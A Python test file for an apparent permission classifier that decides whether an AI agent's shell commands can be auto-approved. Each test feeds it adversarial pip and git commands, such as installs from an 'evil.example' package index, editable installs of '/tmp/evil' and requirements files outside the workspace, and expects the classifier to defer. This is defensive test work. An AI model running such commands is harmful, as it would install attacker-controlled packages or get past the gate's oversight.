"""A2 adversarial fixes -- s25 review findings F1-F6, one red test each.

Each case must return None (the gate decides as today) after the fix.
Run through the gate; red on ee667939 before the fix.
"""
from __future__ import annotations

import delfin.agent.workspace_selfservice as ws


def test_f1_index_url_equals_form_is_none(tmp_path):
    _make_venv(tmp_path)
    for opt in ("--index-url=https://evil.example/simple",
                "-i=https://evil.example/simple",
                "--extra-index-url=https://evil.example/simple"):
        cmd = f".venv/bin/pip install -r requirements.txt --require-hashes {opt}"
        assert ws.classify(cmd, str(tmp_path)) is None, opt


def test_f2_attached_editable_is_none(tmp_path):
    _make_venv(tmp_path)
    for opt in ("-e.", "-e/tmp/evil", "--editable=.", "--editable ."):
        cmd = f".venv/bin/pip install -r requirements.txt --require-hashes {opt}"
        assert ws.classify(cmd, str(tmp_path)) is None, opt


def test_f3_branch_with_dotdot_is_none(tmp_path):
    assert ws.classify("git switch -c a..b", str(tmp_path)) is None


def test_f4_gh_bare_version_is_none(tmp_path):
    assert ws.classify("gh version", str(tmp_path)) is None
    assert ws.classify("bash -V", str(tmp_path)) is None


def test_f5_multiple_r_last_wins_outside_is_none(tmp_path):
    _make_venv(tmp_path)
    (tmp_path / "requirements.txt").write_text("numpy==1.26.4\n")
    # Real outside: a sibling of the workspace, not a subfolder of it.
    outside = tmp_path.parent / "a2_f5_evil"
    outside.mkdir(exist_ok=True)
    (outside / "evil.txt").write_text("numpy\n")
    cmd = f".venv/bin/pip install -r requirements.txt -r {outside}/evil.txt --require-hashes"
    assert ws.classify(cmd, str(tmp_path)) is None


def test_f6_aborted_r_swallows_flag_is_none(tmp_path):
    _make_venv(tmp_path)
    # -r takes --require-hashes as its value -> no pinned flag is really
    # present; and the value is not a requirements file inside.
    assert ws.classify(".venv/bin/pip install -r --require-hashes",
                       str(tmp_path)) is None


def test_f7_negative_r_value_flag_is_none(tmp_path):
    _make_venv(tmp_path)
    assert ws.classify(".venv/bin/pip install -r -q --require-hashes",
                       str(tmp_path)) is None


def _make_venv(tmp_path):
    d = tmp_path / ".venv" / "bin"
    d.mkdir(parents=True, exist_ok=True)
    (d / "pip").write_text("#!/bin/sh\n")
    (tmp_path / "requirements.txt").write_text("numpy==1.26.4\n")
